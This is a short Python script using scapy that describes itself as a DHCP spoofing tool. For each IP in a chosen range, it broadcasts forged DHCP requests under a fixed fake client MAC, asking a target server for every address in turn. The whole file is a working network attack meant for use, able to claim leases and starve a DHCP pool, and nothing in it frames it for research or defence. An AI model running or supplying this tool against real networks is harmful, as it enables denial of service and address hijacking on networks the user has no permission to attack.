
from netaddr import IPNetwork
from scapy.all import *
from argparse import ArgumentParser, RawTextHelpFormatter

# turn off scapy verbosity
conf.verb = False

# required as response IP will not correlate
conf.checkIPaddr = False


def main(args):
    print "[+] starting DHCP spoofing"

    for ip in IPNetwork(args.ip_range):
        mac = "28:C6:3F:32:41:6F"
        mac_raw = mac.replace(':', '').decode('hex')

        request = Ether(src="28:C6:3F:32:41:6E", dst="ff:ff:ff:ff:ff:ff") \
                  / IP(src="0.0.0.0", dst="255.255.255.255") \
                  / UDP(sport=68, dport=67) \
                  / BOOTP(chaddr=mac_raw, xid=RandInt()) \
                  / DHCP(
             options=[
                 ("message-type", "request"),
                 ("server_id", args.server),
                 ("requested_addr", str(ip)),
                 "end"])

        print "[+] spoofing ip: [%s] with mac: [%s]" % (ip, mac)
        sendp(request, iface=args.iface)
        time.sleep(args.sleep)

    print "[+] finished spoofing addresses"


def list_network_interfaces():
    msg = "network interfaces:\n\n"
    for iface in get_windows_if_list():
        msg += "[%s] => %s\n" % (iface["name"], iface["mac"])

    return msg


if __name__ == "__main__":
    parser = ArgumentParser(description="DHCP tool", epilog=list_network_interfaces(), formatter_class=RawTextHelpFormatter)
    parser.add_argument("iface", type=str, help="network interface to use")
    parser.add_argument("server", type=str, help="dhcp server to spoof against")
    parser.add_argument("ip_range", type=str, help="range of ip's to spoof against")
    parser.add_argument("-s", "--sleep", help="sleep in seconds to wait between spoof packets", type=int, default=5)

    args = parser.parse_args()

    main(args)